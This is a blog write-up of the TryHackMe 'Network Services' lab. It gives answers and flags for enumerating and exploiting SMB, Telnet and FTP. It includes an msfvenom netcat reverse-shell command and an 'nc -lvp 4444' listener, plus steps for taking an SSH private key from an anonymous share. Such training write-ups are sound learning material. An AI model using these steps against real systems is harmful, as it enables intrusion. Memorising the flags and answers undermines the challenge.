---
title: Network Services
author: CYB3RM3
name: CYB3RM3 | Network Services
date: 2023-10-17 06:55:15 +0100
categories: [TryHackMe, Network Exploitation Basics]
tags: [Network, Enumeration, Misconfiguration, Complete Beginner]
---

Learn about, then enumerate and exploit a variety of network services and misconfigurations.

THM Room : [https://tryhackme.com/room/networkservices](https://tryhackme.com/room/networkservices)


## TASK 1 Get Connected
### Ready? Let's get going!
No Answer.

## TASK 2 Understanding SMB
### What does SMB stand for?    
Answer : Server Message Block

### What type of protocol is SMB?    
Answer : response-request

### What do clients connect to servers using?    
Answer : TCP/IP

### What systems does Samba run on?
Answer : Unix

## TASK 3 Enumerating SMB
### Conduct an nmap scan of your choosing, How many ports are open?
Answer : 3

### What ports is SMB running on?
Answer : 139/445

### Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?    
Answer : WORKGROUP

### What comes up as the name of the machine?        
Answer : POLOSMB

### What operating system version is running?    
Answer : 6.1

### What share sticks out as something we might want to investigate?    
Answer : profiles

## TASK 4 Exploiting SMB
### What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?
Answer : 

### Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability. 
No Answer.

### Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:

- using the username "Anonymous"

- connecting to the share we found during the enumeration stage

- and not supplying a password.

Does the share allow anonymous access? Y/N?

Answer : Y

### Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?
Answer : John Cactus

### What service has been configured to allow him to work from home?
Answer : ssh

### Okay! Now we know this, what directory on the share should we look in?
Answer : .ssh

### This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?
Answer : id_rsa

### Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]". Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server. What is the smb.txt flag?
Answer : THM{smb_is_fun_eh?}

## TASK 5 Understanding Telnet
### What is Telnet?    
Answer : application protocol

### What has slowly replaced Telnet?    
Answer : ssh

### How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?
Answer : telnet 10.10.10.3 23

### The lack of what, means that all Telnet communication is in plaintext?
Answer : encryption

## TASK 6 Enumerating Telnet
### How many ports are open on the target machine?    
Answer : 1

### What port is this?
Answer : 8012

### This port is unassigned, but still lists the protocol it's using, what protocol is this?     
Answer : tcp

### Now re-run the nmap scan, without the -p- tag, how many ports show up as open?
Answer : 0

### Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.
No Answer.

### Based on the title returned to us, what do we think this port could be used for?
Answer : a backdoor

### Who could it belong to? Gathering possible usernames is an important step in enumeration.
Answer : Skidy

### Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.
No Answer. 

## TASK 7 Exploiting Telnet
### Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.
No Answer.

### Great! It's an open telnet connection! What welcome message do we receive?
Answer : SKIDY'S BACKDOOR.

### Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
Answer : N

### Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command. 
No Answer.

### This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.
No Answer

### Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
Answer : Y

### Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!
No Answer.

### We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax: "msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
Answer : mkfifo

### What would the command look like for the listening port we selected in our payload?
Answer : nc -lvp 4444

### Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!
No Answer.

### Success! What is the contents of flag.txt?
Answer : THM{y0u_g0t_th3_t3ln3t_fl4g}

## TASK 8 Understanding FTP
### What communications model does FTP use?
Answer : client-server

### What's the standard FTP port?
Answer : 21

### How many modes of FTP connection are there?    
Answer : 2

## TASK 9 Enumerating FTP
### How many ports are open on the target machine? 
Answer : 2

### What port is ftp running on?
Answer : 21

### What variant of FTP is running on it?  
Answer : vsftpd

### What is the name of the file in the anonymous FTP directory?
Answer : PUBLIC_NOTICE.txt

### What do we think a possible username could be?
Answer : mike

### Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that...
No Answer.

## TASK 10 Exploiting FTP
### What is the password for the user "mike"?
Answer : password

### Bingo! Now, let's connect to the FTP server as this user using "ftp [IP]" and entering the credentials when prompted
No Answer.

### What is ftp.txt?
Answer : THM{y0u_g0t_th3_ftp_fl4g}

## TASK 11 Expanding Your Knowledge 
### Well done, you did it!
No Answer.